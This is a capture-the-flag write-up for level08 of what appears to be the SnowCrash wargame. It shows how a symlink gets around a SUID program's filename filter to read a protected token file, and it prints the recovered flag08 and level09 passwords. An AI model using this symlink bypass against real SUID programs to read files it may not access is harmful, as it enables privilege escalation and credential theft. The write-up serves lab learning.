# level08

## Goal
Read the `flag08`-owned `token` file, then use it to become flag08 and run getflag.

## Recon
```sh
$ ls -l ~
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
$ ~/level08
/home/user/level08/level08 [file to read]
$ ~/level08 ~/token
You may not access '/home/user/level08/token'
$ strings ~/level08 | grep -E 'token|You may'
token
You may not access '%s'
```

`level08` is a SUID flag08 program that opens and prints any file you name - **except**
it refuses (`strstr`) any path whose string contains `token`. The secret `token` file
is mode `600 flag08`, so only that program can read it for us.

## Exploit - symlink with a name that doesn't contain "token"
The filter is on the *string you pass*, not on the real target. Point a differently
named symlink at the token file:

```sh
$ ln -s /home/user/level08/token /tmp/l8link
$ ~/level08 /tmp/l8link
quif5eloekouj29ke0vouxean
```

(Note: a name like `notoken` would still fail - it *contains* "token". Any name
without that substring works.)

That string is **flag08's password**. Switch to flag08 and grab the real token:

```sh
$ ssh flag08@<VM> -p 4242        # password: quif5eloekouj29ke0vouxean
flag08@SnowCrash$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Result
- **flag08 password:** `quif5eloekouj29ke0vouxean`
- **level09 password (token):** `25749xKZ8L7DkSCwJkT9dyv6f`
